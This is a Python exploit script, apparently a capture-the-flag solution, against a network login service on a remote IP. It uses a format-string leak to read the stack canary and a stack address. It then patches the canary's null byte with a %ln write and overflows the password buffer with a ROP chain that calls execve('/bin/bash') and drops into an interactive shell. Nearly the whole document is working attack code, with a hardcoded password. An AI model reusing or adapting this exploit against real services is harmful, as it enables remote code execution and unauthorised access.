from isis import *
import re
password = 't4l3sp1n'

shell_cmd='/bin/bash'

def convert_stack_addr_to_bp(int):
    return int-0x70

def convert_stack_addr_to_ret(int):
    return int-0x70+4

def convert_stack_addr_to_arg1(int):
    return int-0x70+0xc

def convert_stack_addr_to_arg2(int):
    return int-0x70+0x10

def convert_stack_addr_to_binsh(int):
    return int-0x11a+7-len(shell_cmd)

def convert_stack_addr_to_cookie(int):
    return int-0x8c



def leak_stack_addr(s):
    s.recv(0x100)#enter name
    
    s.send('%83$p%90$p'+'\xcc'*(55-len(shell_cmd))+shell_cmd+'\n') 
    s.recv(0x100)#enter password
    s.send('\n')
    results=re.findall(': (.{10})(.{10})',s.recv(0x100))[0]
    #leak the stack cookie and a base address
    addr,stack=map(lambda a:int(a,16),results)
    return addr,stack

def smash_bp(s,cookie,stack_addr):
    check=pack("I",cookie+1)*2 #last bit of cookie is null. Add one so
                               #we can keep overflowing the buffer. Fix later.
    cookie_addr=pack("I",convert_stack_addr_to_cookie(stack_addr) -3)
    passwd_str=password+check+cookie_addr+'%12$ln' #set nullbyte in cookie
    passwd_str+='A'*(0x20-14)

    binsh=convert_stack_addr_to_binsh(stack_addr)
    
    print 'len {} space {}'.format(len(passwd_str),100-len(passwd_str))
    execve=0x0809B140
    jmp_ebp=0x080e09bb
    pop_ebp=0x0804836a
 
    name=binsh-48
    
    fortune=0x80C6C14
    rop=lei(execve, 0x41414141, binsh, binsh+0x10, binsh+0x10)
    #binsh+10 points to nulls
    #rop=lei(execve, 0x41414141, fortune, binsh+0x10, binsh+0x10)
    #rop=lei(pop_ebp, jmp_ebp, jmp_ebp)

    passwd_str+=rop
    #the first dword of rop lands on the return addr in a stack buffer overflow
    
    print 'len {} space {}'.format(len(passwd_str),100-len(passwd_str))
    s.send(passwd_str+'\n')
    


login_str='Successful login with :'


def crash():
    #s=get_socket(('localhost',10109))
    s=get_socket(('23.23.190.205',10109))
    
    addr,stack_addr=leak_stack_addr(s)
    print "cookie: {}".format(hex(addr))
    print "stack: {}".format(hex(stack_addr))
    smash_bp(s,addr,stack_addr)
    return s



s=crash()
telnet_shell(s)
